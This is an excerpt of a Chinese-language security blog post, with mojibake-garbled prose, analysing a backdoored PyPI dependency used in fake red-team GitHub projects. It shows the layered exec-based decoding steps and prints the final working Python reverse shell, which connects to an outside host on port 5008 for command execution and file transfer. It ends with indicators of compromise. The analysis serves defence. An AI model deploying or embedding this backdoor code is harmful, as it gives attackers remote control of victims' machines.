<figure data-type="image" tabindex="10"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031431353.png" alt="image-20230103143156290" loading="lazy"></figure>
<h6 id="è§£å¯†åä»£ç -4">è§£å¯†åä»£ç </h6>
<pre><code class="language-python">from cryptography.fernet import Fernet

encrypted_message = 'åŒæ ·æ˜¯å¾ˆé•¿çš„ä¸€æ®µåŠ å¯†å­—ç¬¦ä¸²'
key = b'fFdnVFFLuGqYOndl9Xvp9pRnOenZ__grZS5sFssfiX4='

f = Fernet(key)
decrypted_message = f.decrypt(encrypted_message.encode())
exec(decrypted_message.decode())
</code></pre>
<h5 id="245-äº”å±‚åŠ å¯†">2.4.5 äº”å±‚åŠ å¯†</h5>
<h6 id="åŠ å¯†ä»£ç -5">åŠ å¯†ä»£ç </h6>
<p>ä¸Šä¸€æ­¥è§£å¯†åä»£ç ä¸­çš„é‚£æ®µå¾ˆé•¿çš„åŠ å¯†å­—ç¬¦ä¸²</p>
<figure data-type="image" tabindex="11"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031431707.png" alt="image-20230103143112622" loading="lazy"></figure>
<h6 id="è§£å¯†åä»£ç -5">è§£å¯†åä»£ç </h6>
<pre><code>import codecs
exec(codecs.decode(b'åŒæ ·æ˜¯å¾ˆé•¿çš„ä¸€æ®µåŠ å¯†å­—ç¬¦ä¸²', &quot;hex&quot;).decode())
</code></pre>
<h5 id="246-å…­å±‚åŠ å¯†">2.4.6 å…­å±‚åŠ å¯†</h5>
<h6 id="åŠ å¯†ä»£ç -6">åŠ å¯†ä»£ç </h6>
<p>ä¸Šä¸€æ­¥è§£å¯†åä»£ç ä¸­çš„é‚£æ®µå¾ˆé•¿çš„åŠ å¯†å­—ç¬¦ä¸²</p>
<figure data-type="image" tabindex="12"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031430009.png" alt="image-20230103143048939" loading="lazy"></figure>
<h6 id="è§£å¯†åä»£ç -6">è§£å¯†åä»£ç </h6>
<pre><code>import gzip

code = b&quot;åŒæ ·æ˜¯å¾ˆé•¿çš„ä¸€æ®µåŠ å¯†å­—ç¬¦ä¸²&quot;.decode()
exec(gzip.decompress(code.encode('cp437')).decode())
</code></pre>
<h5 id="247-ä¸ƒå±‚åŠ å¯†">2.4.7 ä¸ƒå±‚åŠ å¯†</h5>
<h6 id="åŠ å¯†ä»£ç -7">åŠ å¯†ä»£ç </h6>
<figure data-type="image" tabindex="13"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031430457.png" alt="image-20230103143015389" loading="lazy"></figure>
<h6 id="è§£å¯†åä»£ç -7">è§£å¯†åä»£ç </h6>
<pre><code>import socket
import json
import subprocess
import time
import os
import sys
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(2)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()
def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'background':  # BEGIN
            pass
        elif command == 'help':  # ideally to be removed
            pass
        elif command == 'clear':
            pass  # END
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             stdin=subprocess.PIPE)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)
def connection():
    while True:
        time.sleep(5)
        try:
            s.connect(('blazywound.ignorelist.com', 5008))
            shell()
            s.close()
            break
        except:
            connection()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
</code></pre>
<h4 id="25-é¡¹ç›®ä½œè€…">2.5 é¡¹ç›®ä½œè€…</h4>
<p>é€šè¿‡å¯¹æŠ•æ¯’é¡¹ç›®çš„å®¿ä¸»è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°æ­¤ç”¨æˆ·è‡ªç§°ä¸ºæ¼æ´èµé‡‘çŒäººå’Œæ¸—é€æµ‹è¯•äººå‘˜çš„ä¸€åå¤§å­¦ç”Ÿï¼Œè‡ªæˆ‘ä»‹ç»åŒ…è£…çš„å‡ ä¹å®Œç¾ï¼Œä¸”æ‹¥æœ‰<strong>è¿‘300åçš„å…³æ³¨è€…</strong>ï¼Œå…±å‘å¸ƒ<strong>35ä¸ªåŸåˆ›çº¢é˜Ÿç›¸å…³é¡¹ç›®</strong>ã€‚</p>
<pre><code>https://github.com/machine1337?tab=repositories&amp;q=&amp;type=source&amp;language=&amp;sort=
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031327351.png" alt="image-20230103132731291" loading="lazy"></figure>
<p>ç»è¿‡è°ƒæŸ¥ï¼Œæ‰€æœ‰Pythoné¡¹ç›®éƒ½æ˜¯ç›¸åŒæ‰‹æ³•ï¼Œé€šè¿‡PYPIä¾èµ–åº“è¿›è¡Œéƒ¨ç½²åé—¨ï¼Œæ—©æœŸé¡¹ç›®è¿˜æœ‰ä½¿ç”¨shæ–‡ä»¶çš„æ‰‹æ³•ï¼Œæœ€æ—©çš„åé—¨é¡¹ç›®å­˜åœ¨äº<strong>2021.9.24</strong>ï¼Œå¹¶äº<strong>2022.11æœˆåˆ°12æœˆè´¦å·æ¢å¤æ´»è·ƒ</strong>ã€‚</p>
<figure data-type="image" tabindex="15"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031333824.png" alt="image-20230103133336768" loading="lazy"></figure>
<h3 id="0x03-åˆ†æç»“æœ">0x03 åˆ†æç»“æœ</h3>
<p>ä¸€å2022.11æœˆåˆ°12æœˆæ¢å¤æ´»è·ƒçš„ä¸“é—¨é’ˆå¯¹çº¢é˜Ÿçš„é’“é±¼äººå‘˜æˆ–è€…æŸä¸ªç»„ç»‡ï¼Œé€šè¿‡æŠ•æ¯’PYPIä¾èµ–åº“ï¼Œå†å‘å¸ƒåå¤„ç†å…æ€é¡¹ç›®åŠå…¶ä»–çº¢é˜Ÿé¡¹ç›®è¿›è¡Œå¯¼å…¥ä¾èµ–ï¼Œç»è¿‡ä¸ƒå±‚ä¸­è½¬çš„åŠ å¯†ä»£ç ï¼Œæœ€ç»ˆä¸blazywound.ignorelist.co:5008è¿›è¡Œsocketé€šä¿¡è¿›è¡Œä¸Šçº¿æœºå™¨ï¼Œåé—¨å®é™…æ‹¥æœ‰çš„åŠŸèƒ½ä¸º: åˆ‡æ¢å·¥ä½œç›®å½•ã€ä¸Šä¼ æ–‡ä»¶ã€ä¸‹è½½æ–‡ä»¶ã€ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p>
<h3 id="0x04-ioc">0x04 IOC</h3>
<h4 id="host">Host</h4>
<p>blazywound.ignorelist.co:5008</p>
<h4 id="hash">Hash</h4>
<table>
<thead>
<tr>
<th>Linux</th>
<th>md5 Hash</th>
</tr>
</thead>
<tbody>
<tr>
<td>/tmp/file.py</td>
<td>ee69b2d189165555d4ec32f944cb262c</td>
</tr>
<tr>
<td>/home/$USER/.msfdb/update/.path.sh</td>
<td>5412834b8be0ee5cdeeede11430ca17c</td>
</tr>
<tr>
<td>/home/$USER/.msfdb/update/update.py</td>
<td>c855106e06b259d2b30bd754561ea9a</td>
</tr>
</tbody>
</table>
]]></content>
    </entry>
</feed>